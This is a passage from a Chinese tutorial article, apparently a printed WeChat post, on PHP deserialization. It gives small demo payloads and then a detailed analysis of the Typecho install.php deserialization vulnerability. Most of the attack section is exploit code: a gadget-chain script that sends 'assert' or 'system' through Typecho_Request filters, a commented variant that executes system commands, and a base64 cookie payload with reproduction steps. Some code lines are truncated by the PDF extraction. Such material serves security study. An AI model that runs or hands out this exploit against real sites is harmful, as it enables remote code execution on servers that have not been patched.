7 $del->name = 'ccc.php';
8 echo serialize($del);
9
10 // demo2.php?id=O:6:"delete":1:{s:4:"name";s:7:"ccc.php";}
⼩案例2
1 // demo3.php
https://mp.weixin.qq.com/s/XvnSlGeb69XtAhgNuxYvOw 10/17
2020/7/27 精通PHP序列化与反序列化之"道"
2 name;
8 return file_get_contents($this->name);
9 }
10 }
11
12 // demo4.php
13 name = 'ccc.txt';
8 echo serialize($del);
https://mp.weixin.qq.com/s/XvnSlGeb69XtAhgNuxYvOw 11/17
2020/7/27 精通PHP序列化与反序列化之"道"
Typecho安装⽂件反序列化漏洞
漏洞代码分析:
1 // 要让代码执⾏到这⾥需要满⾜⼀些条件：
2 //判断是否已经安装
3 if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/conf
4 exit;
5 }
6
7 // 挡掉可能的跨站请求
8 if (!empty($_GET) || !empty($_POST)) {
9 if (empty($_SERVER['HTTP_REFERER'])) {
10 exit;
11 }
12
13 $parts = parse_url($_SERVER['HTTP_REFERER']);
14 if (!empty($parts['port']) && $parts['port'] != 80 && !Typecho_Commo
15 $parts['host'] = "{$parts['host']}:{$parts['port']}";
16 }
17
18 if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']
19 exit;
20 }
21 }
22
23 // install.php
24 addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
32 Typecho_Db::set($db);
33 ?>
34
35 // 在Typecho_Db⽅法中进⼊到__construct⽅法
36 public function __construct($adapterName, $prefix = 'typecho_')
37 {
38 $this->_adapterName = $adapterName;
39 // 这⾥进⾏的拼接操作，这⾥可以判断出可能会触发类的__toString()⽅法
40 $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
41 // ...省略
42 }
43
44 // 其中有三个类有使⽤__toString()⽅法：
45 // var/Typecho/Config.php
46 // var/Typecho/Feed.php
47 // var/Typecho/Db/Query.php
48 // 其中Feed可以利⽤,在Feed__toString()⽅法中的290⾏
49 foreach ($this->_items as $item) {
50 $content .= '' . self::EOL;
51 $content .= '' . htmlspecialchars($item['title']) . '
52 $content .= '' . $item['link'] . '' . self::EOL;
53 $content .= '' . $item['link'] . '' . self::EOL;
54 $content .= '' . $this->dateFormat($item['date']) . '' . htmlspecialchars($item['author']->scree
57
58 // 在⽂件Request.php中的__get()⽅法中,获取到了screenName
59 public function __get($key)
60 {
61 echo $key;exit;//screenName
62 return $this->get($key);
63 // 跟进$this->get($key)就是获取screenName的值为phpinfo()，很简单不写了,然后
64 }
https://mp.weixin.qq.com/s/XvnSlGeb69XtAhgNuxYvOw 13/17
2020/7/27 精通PHP序列化与反序列化之"道"
65
66 // 再跟进$this->_applyFilter($value)
67 private function _applyFilter($value)
68 {
69 if ($this->_filter) {
70 foreach ($this->_filter as $filter) {
71 var_dump($filter.'--'. $value);exit;
72 // 这⾥可以看到获取了两个值 "assert--phpinfo()",并交给call_user_f
73 $value = is_array($value) ? array_map($filter, $value) : cal
74 //。。。省略
我们再来回顾⼀边漏洞产⽣的步骤：
1.从Cookie或者POST的数据中寻找到'__typecho_config'字段。
2.然后调⽤'__typecho_config'中的'adapter'和'prefix'实例化⼀个Typecho_Db类。
3.在实例化过程中，采⽤了字符串拼接访问了'adapter'，当我们设置的'adapter'字段是⼀个
类的话，就会触发这个类的__toString()魔术⽅法。
4. 寻 找 到 Feed 这 个 类 中 的 __toString() 魔 术 ⽅ 法 ， 访 问 了 $item['author']-
>screenName。
5.当$item['author']->screenName为⼀个不可访问的属性时，将会触发该类的__get()魔
术⽅法
6.Typecho_Request类的魔术⽅法中，调⽤了get(),该⽅法内，检测了_params[$key]是否
存在。
7.将params[$key]的值传⼊applyFilter()⽅法，并执⾏代码。
// Exploit如下：
1 _type = $this::RSS2;
15 $this->_items[0] = array(
16 'title' => '1',
17 'link' => '1',
18 'date' => 1508895132,
19 'category' => array(new Typecho_Request()),
20 'author' => new Typecho_Request(),
21 );
22 }
23 }
24
25 class Typecho_Request
26 {
27 private $_params = array();
28 private $_filter = array();
29
30 public function __construct(){
31 $this->_params['screenName'] = 'phpinfo()';
32 $this->_filter[0] = 'assert';
33 }
34 // 执⾏系统命令
35 // public function __construct(){
36 // $this->_params['screenName'] = 'ipconfig';
37 // $this->_filter[0] = 'system';
38 // }
39 }
40
41 $exp = array(
42 'adapter' => new Typecho_Feed(),
43 'prefix' => 'typecho_'
44 );
45
46 echo base64_encode(serialize($exp));
47
48 // payload
49 __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp
https://mp.weixin.qq.com/s/XvnSlGeb69XtAhgNuxYvOw 15/17
2020/7/27 精通PHP序列化与反序列化之"道"
复现漏洞：
将payload传⼊cookie中。
https://mp.weixin.qq.com/s/XvnSlGeb69XtAhgNuxYvOw 16/17
2020/7/27 精通PHP序列化与反序列化之"道"
https://mp.weixin.qq.com/s/XvnSlGeb69XtAhgNuxYvOw 17/17